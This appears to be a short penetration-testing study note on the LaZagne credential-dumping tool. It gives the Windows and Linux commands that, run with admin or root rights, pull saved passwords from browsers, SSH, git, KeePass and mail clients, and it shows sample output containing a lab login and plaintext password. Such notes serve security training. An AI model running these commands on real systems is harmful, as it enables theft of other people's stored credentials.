- Pulls saved credentials from a huge list of installed apps (browsers, wifi, ssh, git, keepass, mail clients, etc), works on both Windows and Linux
- Needs admin/root

```bash
# Windows
LaZagne.exe all

# Linux
sudo python3 laZagne.py all
sudo python3 laZagne.py browsers   # just target 1 category instead of all


# Example Output
------------------- Winscp passwords -----------------  
[+] Password found !!!  
URL: 10.129.202.51  
Login: admin  
Password: SteveisReallyCool123
```
- Output shows source + login + password directly, no extra cracking step needed, these are usually stored in a reversible/weak way by the app itself
- Use `-v` or `-vv` for more detail on what it's checking in the background